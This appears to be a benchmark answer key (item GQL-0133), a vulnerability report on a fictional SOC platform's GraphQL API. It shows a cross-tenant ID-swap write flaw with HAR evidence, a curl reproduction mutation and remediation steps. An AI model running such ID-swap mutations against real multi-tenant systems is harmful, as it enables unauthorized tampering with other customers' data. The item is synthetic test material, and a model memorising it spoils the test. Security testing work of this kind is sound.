# Expected Response

## System
- Domain: Cybersecurity / SIEM
- System: ThreatLens SOC Platform
- Example ID: GQL-0133

## Priority Findings

### Finding 1: SIEM SOC Platform — ID Swap Write Access to Cross-Tenant Threat Intelligence (Pattern 1.1)
**Severity:** Critical
**Category:** BOLA / ID in Path Without Ownership Check

**Summary:**
Per §5.0 (Pattern 1.1 — ID in path without ownership check): The `updateResource` resolver accepts `resourceId` from the query without verifying ownership. An attacker from `tenant-116a` issued `updateResource(id: "R-2133", input: {status: "approved", ownerId: "attacker-116aae7a"})` against a SOC threat intelligence resource belonging to `tenant-ae7a`, gaining cross-tenant write access and receiving `CONFIDENTIAL-116aae7a`. In Cybersecurity / SIEM, unauthorized mutation of threat intelligence records can alter alert triage, suppress incidents, and sabotage active security investigations.

**Evidence from HAR:**
- Request: `POST https://api.threatlens-soc-platf.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-116a`
- Mutation: `updateResource(id: "R-2133", input: {status: "approved", ownerId: "attacker-116aae7a"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-ae7a"`, `ownerId: "other-user-116aae7a"`, `sensitiveField: "CONFIDENTIAL-116aae7a"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-116aae7a`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.1 | updateResource, no ownership check on ID |
| HAR request | x-tenant-id | Attacker tenant-116a |
| HAR request | input.ownerId | attacker-116aae7a (client-injected) |
| HAR response | tenantId | Cross-tenant tenant-ae7a SOC data |

## Steps to Reproduce

### Step 1 — updateResource on SIEM alert (HAR)
```bash
curl -s -X POST https://api.threatlens-soc-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-116a" \
  -d '{"query": "mutation { updateResource(id: \"R-2133\", input: {status: \"approved\", ownerId: \"attacker-116aae7a\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-ae7a` SOC resource mutated. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`.
3. SOC alert state machine: require approval from the owning tenant's analyst role.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
